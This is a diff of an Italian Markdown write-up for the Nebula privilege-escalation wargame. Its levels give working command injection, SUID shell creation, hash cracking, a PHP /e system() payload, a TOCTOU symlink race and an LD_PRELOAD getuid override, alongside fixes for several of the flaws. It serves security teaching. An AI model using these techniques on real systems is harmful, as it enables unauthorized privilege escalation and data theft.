@@ -2,14 +2,14 @@
 
 ## Info utili
 20 challenge in totale. Si accede alle challenge con:
-- user: levelN
-- passwd: levelN
+- **user**: levelN
+- **passwd**: levelN
 
 Gli account flagN contengono le vulnerabilità
 
 Login amministratore:
-- user: nebula
-- passwd: nebula
+- **user**: nebula
+- **passwd**: nebula
 
 Shell di root:
 1. sudo -i
@@ -30,7 +30,10 @@ Eseguire il file ed eseguire getflag.
 
 ### Level01
 
-L'eseguibile SUID /home/flag01/flag01 invoca echo utilizzando il comando env. Con questo comando non si invoca echo builtin ma si invoca echo esterno (quello in /bin). Si possono verificare il tipo di comandi echo disponibili mediante *type -a echo*.
+L'eseguibile SUID /home/flag01/flag01 invoca echo utilizzando il comando *env*. Con questo comando non si invoca echo builtin ma si invoca echo esterno (quello in /bin). Si possono verificare il tipo di comandi echo disponibili mediante il seguente comando
+```bash
+type -a echo
+```
 
 Si può modificare l'ambiente per invocare con echo un binario arbitrario. Per farlo si crei un file in una qualsiasi cartella, ad esempio /tmp/echo.
 
@@ -87,7 +90,7 @@ putenv(“PATH=/bin:/sbin:/usr/bin:/usr/sbin”);
 
 ### Level02
 
-L'eseguibile SUID flag02 presente nella home di flag02 stampa in output il comando che esegue. Il comando arbitrario può essere iniettato modificando la variabile di ambiente $USER.
+L'eseguibile SUID flag02 presente nella home di flag02 stampa in output il comando che esegue. Il comando arbitrario può essere iniettato modificando la variabile di ambiente *$USER*.
 
 ```bash
 USER="string; getflag; echo"
@@ -99,7 +102,7 @@ Eseguire il file.
 Si può semplicemente eliminare il messaggio di debug (l'eseguibile rimane comunque passibile di attacco)
 
 #### Fix: input di un valore fidato al posto di USER
-Invece che prelevare il valore di USER, esposto a potenziali iniezioni di codice, si può ottenere il nome utente e mantenere lo scopo del binario utilizzando una funzione di libreria apposita, tramite la quale è impossibile effettuare iniezioni di codice.
+Invece che prelevare il valore di *$USER*, esposto a potenziali iniezioni di codice, si può ottenere il nome utente e mantenere lo scopo del binario utilizzando una funzione di libreria apposita, tramite la quale è impossibile effettuare iniezioni di codice.
 ```c
 passwd = getpwuid(getuid());
 if (passwd == NULL) {
@@ -111,7 +114,7 @@ asprintf(&buffer, "/bin/echo %s is cool", passwd->pw_name);
 ```
 
 #### Fix: implementazione di una blacklist per filtrare USER
-Si crea una blacklist contenente tutti i caratteri vietati nel nome utente, se almeno uno è presente in USER allora il programma termina con errore. Superata questa fase di filtro viene effettuata la validazione: se lo USER inizia con - o con _ potrebbe causare problemi e viene scartato.
+Si crea una blacklist contenente tutti i caratteri vietati nel nome utente, se almeno uno è presente in *$USER* allora il programma termina con errore. Superata questa fase di filtro viene effettuata la validazione: se lo *$USER* inizia con - o con _ potrebbe causare problemi e viene scartato.
 ```c
 /* sanitizing */
 if ((strpbrk(buffer, invalid_chars)) != NULL) {
@@ -126,7 +129,7 @@ if (getenv("USER")[0] == '-' || getenv("USER")[0] == '_') {
 ```
 
 #### Fix: implementazione di una whitelist per filtrare USER
-In questo caso la fase di filtro viene effettuata da una whitelist che verifica che USER contenga solamente caratteri alfanumerici e/o - e _
+In questo caso la fase di filtro viene effettuata da una whitelist che verifica che *$USER* contenga solamente caratteri alfanumerici e/o - e _
 ```c
 p = getenv("USER");
 while (*p != 0) {
@@ -139,10 +142,9 @@ else {
 }
 ```
 
-
 ### Level03
 
-Il file /home/flag03/writable.sh viene chiamato da un crontab ogni 2 minuti. Per verificare:
+Il file /home/flag03/writable.sh viene chiamato da un *crontab* ogni 2 minuti. Per verificare:
 
 ```bash
 su – nebula
@@ -151,9 +153,9 @@ su – flag03
 crontab -l
 ```
 
-Esegue tutti i file contenuti in writable.d per 5 secondi. Quindi è possibile eseguire un file arbitrario con i permessi di flag03. L'obiettivo è quello di spawnare una shell con i permessi di flag03.
+Esegue tutti i file contenuti in *writable.d* per 5 secondi. Quindi è possibile eseguire un file arbitrario con i permessi di flag03. L'obiettivo è quello di spawnare una shell con i permessi di flag03.
 
-Si crea uno script e lo si mette in writable.d. Lo script copia il binario di bash in un file e lo rende SUID, in modo che eseguendo quella bash si otterranno i permessi di flag03.
+Si crea uno script e lo si mette in *writable.d*. Lo script copia il binario di bash in un file e lo rende SUID, in modo che eseguendo quella bash si otterranno i permessi di flag03.
 
 ```bash
 nano src.sh
@@ -198,7 +200,7 @@ Autenticarsi come flag04 con il token visualizzato ed eseguire getflag.
 
 ### Level05
 
-Nella home di flag05 è presente una cartella .backup che è accessibile a tutti gli utenti. All'interno di questa cartella è presente un archivio non direttamente estraibile per mancanza di permessi.
+Nella home di flag05 è presente una cartella *.backup* che è accessibile a tutti gli utenti. All'interno di questa cartella è presente un archivio non direttamente estraibile per mancanza di permessi.
 
 #### Soluzione 1
 Si copia l'archivio nella home di level05 e si estrae
@@ -209,7 +211,7 @@ cd /home/level05
 tar -xvzf backup-19072011.tgz
 ```
 
-I file estratti finiscono nella cartella /home/.ssh. La chiave pubblica è inserita in autohorized_keys, quindi si presume che per accedere all'account di flag05 si possa usare la chiave privata id_rsa. Ci si connette quindi con ssh in localhost.
+I file estratti finiscono nella cartella */home/.ssh*. La chiave pubblica è inserita in *autohorized_keys*, quindi si presume che per accedere all'account di flag05 si possa usare la chiave privata *id_rsa*. Ci si connette quindi con ssh in localhost.
 
 ```bash
 ssh flag05@localhost
@@ -235,28 +237,28 @@ Si esegue poi getflag
 
 ### Level06
 
-La password di flag06 proviene da un sistema unix legacy. Infatti analizzando /etc/passwd si nota che la password dell'utente flag06 è memorizzata cifrata, al posto della solita 'x'. (Nei sistemi moderni l'hash della passwd è visibile solo in /etc/shadow e solo da root). Si copia l'hash in un file locale e si esegue hashid per capire l'algoritmo di cifratura utilizzato.
+La password di flag06 proviene da un sistema unix legacy. Infatti analizzando /etc/passwd si nota che la password dell'utente flag06 è memorizzata cifrata, al posto della solita 'x'. (Nei sistemi moderni l'hash della passwd è visibile solo in /etc/shadow e solo da root). Si copia l'hash in un file locale e si esegue *hashid* per definire l'algoritmo di cifratura utilizzato.
 
 ```bash
 hashid -m flag06.hash
 ```
 
-Questo comando restituisce sia l'algoritmo utilizzato sia la modalità da specificare in hashcat per rompere l'hash.
+Questo comando restituisce sia l'algoritmo utilizzato sia la modalità da specificare in *hashcat* per rompere l'hash.
 
 ```bash
 hashcat -a 0 -m 1500 flag06.hash passwd.txt
 ```
 
-Dove *-a 0* specifica attacco a dizionario e *-m 1500* l'algoritmo DES, trovato prima con hashid.
+Dove **-a 0** specifica attacco a dizionario e **-m 1500** l'algoritmo DES, trovato prima con hashid.
 
 Si effettua ora il login a flag06 e si esegue getflag.
 
 #### Fix: Hash della password dell'utente flag06 esposta pubblicamente in /etc/passwd
-Per mitigare la debolezza è sufficiente, da root, spostare l'hash da /etc/passwd a /etc/shadow, inserendo al posto della password in /etc/passwd una x.
+Per mitigare la debolezza è sufficiente, da root, spostare l'hash da /etc/passwd a /etc/shadow, inserendo al posto della password in /etc/passwd una 'x'.
 
 ### Level07
 
-Esaminando il file *thttpd.conf* contenuto nella home di flag07 si capisce che viene esposto un web server alla porta 7007, che esegue con i privilegi di flag07 e che serve la directory /home/flag07.
+Esaminando il file *thttpd.conf* contenuto nella home di flag07 si capisce che viene esposto un web server alla porta 7007, che esegue con i privilegi di flag07 e che serve la directory */home/flag07*.
 
 Esaminando lo script *index.cgi*, è possibile iniettare comandi arbitrari tramite parametro *Host* della querystring. Si esegue quindi il seguente comando per risolvere la challenge.
 
@@ -265,10 +267,10 @@ echo -ne "GET /index.cgi?Host=localhost%3Bgetflag\r\n\r\n" | nc localhost 7007
 ```
 
 In cui:
-- l'opzione -n di echo serve a disattivare \n automatico alla fine del messaggio
-- l'opzione -e serve a interpretate le sequenze di escaping
-- \r\n serve a terminare la linea del protocollo HTTP e a terminare il messaggio intero (per questo è ripetuto due volte).
-- %3b è il corrispondente urlencoded del carattere ';', che altrimenti lo script interpreterebbe come separatore dei parametri
+- l'opzione **-n** di echo serve a disattivare \n automatico alla fine del messaggio
+- l'opzione **-e** serve a interpretate le sequenze di escaping
+- **\r\n** serve a terminare la linea del protocollo HTTP e a terminare il messaggio intero (per questo è ripetuto due volte).
+- **%3b** è il corrispondente urlencoded del carattere ';', che altrimenti lo script interpreterebbe come separatore dei parametri
 
 #### Fix: l'utente che esegue il web server ha privilegi troppo elevati
 Basta sostituire l'utente in *thttpd.conf* (flag07) con l'utente meno privilegiato (level07) e riavviare il web server da root.
@@ -281,19 +283,19 @@ Nella cartella di flag08 è presente un file .pcap leggibile da tutti. Si copia 
 scp -P 2222 level08@localhost:/home/flag08/capture.pcap .
 ```
 
-Si apre il file con Wireshark e con tasto destro > follow si segue il flusso TCP. Il flusso visualizzato in ASCII mostra una password con dei punti. Cliccando su un punto si scopre che il byte corrispondente al carattere non stampabile è 0x7f, che corrisponde al carattere DEL. Si ricostruisce quindi la password finale ***backd00Rmate*** e la si usa per loggare nell'account di flag08.
+Si apre il file con Wireshark e con tasto destro > follow si segue il flusso TCP. Il flusso visualizzato in ASCII mostra una password con dei punti. Cliccando su un punto si scopre che il byte corrispondente al carattere non stampabile è *0x7f*, che corrisponde al carattere DEL. Si ricostruisce quindi la password finale **backd00Rmate** e la si usa per loggare nell'account di flag08.
 
 Si esegue poi getflag.
 
 ### Level09
-Il binario è un wrapper di uno script PHP che accetta file con righe in formato [email *altro*]. In altro è possibile specificare un comando arbitrario da eseguire mediante interpolazione delle stringhe PHP. Il comando viene eseguito grazie al modificatore /e contenuto nella regex di preg_replace.
+Il binario è un wrapper di uno script PHP che accetta file con righe in formato **[email *altro*]**. In altro è possibile specificare un comando arbitrario da eseguire mediante interpolazione delle stringhe PHP. Il comando viene eseguito grazie al modificatore **/e** contenuto nella regex di preg_replace.
 
 Si crea un file di testo contenente il payload seguente:
 ```php
 [email {${system($use_me)}}]
 ```
 
-In questo modo la chiamata effettuata ad ogni match corrisponderà a spam("{${system($use_me)}}"). PHP esegue prima il comando interpolato. Il comando va specificato come secondo argomento del binario.
+In questo modo la chiamata effettuata ad ogni match corrisponderà a **spam("{${system($use_me)}}")**. PHP esegue prima il comando interpolato. Il comando va specificato come secondo argomento del binario.
 
 Si esegue quindi il binario in questo modo:
 ```bash
@@ -305,14 +307,14 @@ In questo modo si ottiene una shell con i permessi di flag09 tramite la quale si
 
 Nella home di flag10 si trova un file non accessibile *token* e un file SUID eseguibile da tutti che permette di inviare il contenuto di un file arbitrario ad un server in ascolto. L'obiettivo è quello di riuscire ad ottenere il contenuto di token.
 
-Il codice sorgente dell'eseguibile presenta un pattern TOCTOU: una volta verificati i permessi corrispondenti al file da inviare, si fanno altre operazioni prima di inviare effettivamente il file. Si cerca di sfruttare questa debolezza utilizzando un link simbolico: si vuole che il controllo venga eseguito sul link simbolico che punta ad un file su cui si hanno sufficiente permessi; e poi cambiando destinazione del link si fa inviare all'eseguibile il file token.
+Il codice sorgente dell'eseguibile presenta un **pattern TOCTOU**: una volta verificati i permessi corrispondenti al file da inviare, si fanno altre operazioni prima di inviare effettivamente il file. Si cerca di sfruttare questa debolezza utilizzando un link simbolico: si vuole che il controllo venga eseguito sul link simbolico che punta ad un file su cui si hanno sufficiente permessi; e poi cambiando destinazione del link si fa inviare all'eseguibile il file token.
 
 Si crea quindi un file arbitrario e un link simbolico che punta a quel file.
 ```bash
 touch /tmp/dummy
 ln -fs /tmp/dummy /tmp/link 
 ```
-In questo modo si ha un link simbolico che punta a /tmp/dummy, su cui si hanno i permessi.
+In questo modo si ha un link simbolico che punta a */tmp/dummy*, su cui si hanno i permessi.
 
 In una shell, si crea il server per ricevere i messaggi inviati dall'eseguibile.
 ```bash
@@ -331,7 +333,7 @@ done
 ```
 Questo ciclo cambia continuamente la destinazione del link simbolico
 
-In un'altra shell, si avvia ripetutamente l'eseguibile. Il token viene inviato quando il link punta a /tmp/dummy al momento della verifica dell'accesso e a token al momento dell'effettivo invio del file.
+In un'altra shell, si avvia ripetutamente l'eseguibile. Il token viene inviato quando il link punta a */tmp/dummy* al momento della verifica dell'accesso e a token al momento dell'effettivo invio del file.
 ```bash
 while true; do 
     nice -n 19 /home/flag10/flag10 /tmp/link 127.0.0.1;
@@ -393,11 +395,11 @@ Per mitigare questo problema occorre eliminare il pattern TOCTOU e quindi esegui
 
 ### Level13
 
-Lo script nella home di flag13 controlla che si abbia l'accesso confrontando il valore tornato da getuid con FAKEID definito a 1000 (root). Per iniettera codice arbitrario in questo caso si deve eseguire una library injection. L'obiettivo è quello di sovrascrivere la funzione getuid per far tornare un valore arbitrario, in questo caso 1000.
+Lo script nella home di flag13 controlla che si abbia l'accesso confrontando il valore tornato da getuid con *FAKEID* definito a 1000 (root). Per iniettera codice arbitrario in questo caso si deve eseguire una library injection. L'obiettivo è quello di sovrascrivere la funzione getuid per far tornare un valore arbitrario, in questo caso 1000.
 
-Per farlo, si utilizza la variabile d'ambiente **LD_PRELOAD** che carica shared object prima di linkare dinamicamente altre librerie, in altre parole se qui si ridefinisce la funzione di getuid, la funzione vera presente in libc.so viene ignorata.
+Per farlo, si utilizza la variabile d'ambiente **LD_PRELOAD** che carica shared object prima di linkare dinamicamente altre librerie, in altre parole se qui si ridefinisce la funzione *getuid*, la funzione originale presente in libc.so viene ignorata.
 
-Si deve quindi prima creare un file C contenente la funzione malevola, con la stessa firma di quella dichiara in unistd.h
+Si deve quindi prima creare un file C contenente la funzione malevola, con la stessa firma di quella dichiarata in unistd.h
 ```bash
 nano /tmp/exploit.c
 ```
@@ -415,8 +417,8 @@ Si compila ora il sorgente, in modo tale da trasforlarmo in uno shared object, l
 gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
 ```
 In cui:
-- shared serve a compilare il file come shared object
-- fPIC serve a compilare il file come Position Independent Code, necessario per oggetti shared che vengono caricati in RAM in posizioni sempre diverse
+- **shared** serve a compilare il file come shared object
+- **fPIC** serve a compilare il file come Position Independent Code, necessario per oggetti shared che vengono caricati in RAM in posizioni sempre diverse
 
 Si esporta la variabile LD_PRELOAD
 ```bash
